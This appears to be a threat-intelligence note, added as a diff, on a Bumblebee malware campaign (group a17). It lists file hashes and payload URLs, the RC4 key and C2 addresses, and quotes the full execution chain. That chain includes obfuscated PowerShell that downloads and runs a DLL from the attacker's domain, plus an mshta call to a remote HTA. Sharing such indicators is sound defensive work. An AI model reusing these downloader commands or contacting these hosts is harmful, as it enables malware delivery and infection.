@@ -1,0 +1,87 @@
+17.06.2022 | Bumblebee | a17 |
+
+*************************************************
+
+.img 8e4fdc6db367e299844c890efda88425da66e7f6247b11e89a0eba7fd7c57588
+.lnk 9c4cfd85af061badf6bab38ace88be3a6a21e64fd99571eee8e93fed745261f9
+.hta 3ebe05a1b39deb0ec8e5e24ec096e184041db8f5085a2b1add622589ca05f475
+.dll 3d62ffeaa997dd7e6bdfa072e71a47241960524b31b64a168ca59d69ff680437
+
+hxxps://pidipurev.com/a17_cr99.dll
+hxxps://pidipurev.com/a1799.hta
+
+*************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\PRD.lnk
+
+powershell.exe" $uVOFxPZI = [convert]::FromBase64String('enZr');$SvjOMbNF = [convert]::FromBase64String('XkBbR1ITW0dHQ0AJHBxDWldaQ0ZBVkUdUFxeHFICBAoKHVtHUg==');$OFVQWJMp = -join($uVOFxPZI | % {[char] ($_ -bxor 0x33)});$ZwhCtgVk = -join ($SvjOMbNF | % { [char] ($_ -bxor 0x33)});sal idMJYXuL $OFVQWJMp;idMJYXuL $ZwhCtgVk
+
+mshta.exe" https://pidipurev.com/a1799.hta
+
+powershell.exe" -ExecutionPolicy UnRestricted  function cWJskuQlbOmpMA($ukeBbVmYNH, $EFucjtI){[IO.File]::WriteAllBytes($ukeBbVmYNH, $EFucjtI)};function zyZFKJmgHX($ukeBbVmYNH){if($ukeBbVmYNH.EndsWith((tXhPzTmXMFNFufDI @(68534,68588,68596,68596))) -eq $True){Start-Process (tXhPzTmXMFNFufDI @(rundll32.exe $ukeBbVmYNH ,TSErsNqyhR ))}elseif($ukeBbVmYNH.EndsWith((tXhPzTmXMFNFufDI @(68534,68600,68603,68537))) -eq $True){powershell.exe -ExecutionPolicy unrestricted -File $ukeBbVmYNH}else{Start-Process $ukeBbVmYNH}};function kpcQqRGkdksJXcLvOm($cWJskuQlbOmpMA){$jXeMAsDGusrM=(tXhPzTmXMFNFufDI @(68560,68593,68588,68588,68589,68598));$PlebPQOXHehbVKBBhSo=(Get-ChildItem $cWJskuQlbOmpMA -Force);$PlebPQOXHehbVKBBhSo.Attributes=$PlebPQOXHehbVKBBhSo.Attributes -bor ([IO.FileAttributes]$jXeMAsDGusrM).value__};function CnfznBhFm($qmukbsVTysBgrFlHF){$XovuEuCBHyBHjrpc = New-Object (tXhPzTmXMFNFufDI @(68566,68589,68604,68534,68575,68589,68586,68555,68596,68593,68589,68598,68604));[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;$EFucjtI = $XovuEuCBHyBHjrpc.DownloadData($qmukbsVTysBgrFlHF);return $EFucjtI};function tXhPzTmXMFNFufDI($cIhrmkNsmwm){$CcKhtridtJs=68488;$mssiUtTLO=$Null;foreach($AMEOxEPSnbDIIHAZ in $cIhrmkNsmwm){$mssiUtTLO+=[char]($AMEOxEPSnbDIIHAZ-$CcKhtridtJs)};return $mssiUtTLO};function wRHQAOwSkVoz(){$DQTYahmqYv = $env:AppData + '\';;$bCCPiHWusHeO = $DQTYahmqYv + '';If(Test-Path -Path $bCCPiHWusHeO){Invoke-Item $bCCPiHWusHeO;}Else{ $eSzamRIZLBTJ = CnfznBhFm (tXhPzTmXMFNFufDI @(68592,68604,68604,68600,68603,68546,68535,68535));cWJskuQlbOmpMA $bCCPiHWusHeO $eSzamRIZLBTJ;Invoke-Item $bCCPiHWusHeO;}$CRGBhJNKWPuzGc = $DQTYahmqYv + 'a17_cr99.dll'; if (Test-Path -Path $CRGBhJNKWPuzGc){zyZFKJmgHX $CRGBhJNKWPuzGc;}Else{ $FKoBPFKAjO = CnfznBhFm (tXhPzTmXMFNFufDI @(68592,68604,68604,68600,68603,68546,68535,68535,68600,68593,68588,68593,68600,68605,68602,68589,68606,68534,68587,68599,68597,68535,68585,68537,68543,68583,68587,68602,68545,68545,68534,68588,68596,68596));cWJskuQlbOmpMA $CRGBhJNKWPuzGc $FKoBPFKAjO;zyZFKJmgHX $CRGBhJNKWPuzGc;};kpcQqRGkdksJXcLvOm $CRGBhJNKWPuzGc;;;;;}wRHQAOwSkVoz;
+
+rundll32.exe C:\Users\Admin\AppData\Roaming\a17_cr99.dll TSErsNqyhR
+
+rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
+
+
+*************************************************
+
+Group ID: a17
+RC4 Key: BLACK
+
+https://tria.ge/220617-yjt8tafff3/behavioral2
+
+*************************************************
+
+c2's
+
+220.111.119.123:476
+90.12.112.169:180
+146.70.124.116:443
+47.27.63.45:115
+77.45.24.148:444
+11.1.201.27:344
+224.200.37.92:481
+103.175.16.38:443
+188.8.220.88:269
+12.202.229.195:440
+41.56.181.200:486
+173.171.60.50:394
+5.152.80.211:121
+88.158.143.245:189
+57.242.85.233:131
+30.205.76.70:490
+45.138.172.246:443
+213.226.100.95:443
+46.44.240.53:361
+151.75.118.144:368
+124.77.203.104:343
+12.115.36.174:276
+239.245.67.55:401
+102.51.3.25:432
+64.131.183.17:402
+246.126.195.66:313
+185.62.56.181:443
+207.159.38.174:412
+171.175.237.53:349
+53.74.73.76:297
+93.61.106.53:231
+243.29.153.81:270
+175.187.178.6:302
+207.185.174.1:240
+251.170.118.186:302
+183.90.191.234:276
+228.27.113.15:219
+83.183.152.159:280
+85.239.33.172:443
+6.249.22.42:129
+45.147.229.199:443
+202.123.74.131:227
+55.119.41.81:187
+14.7.69.141:109
+184.198.223.201:113
+194.123.215.252:114
+73.235.164.95:474
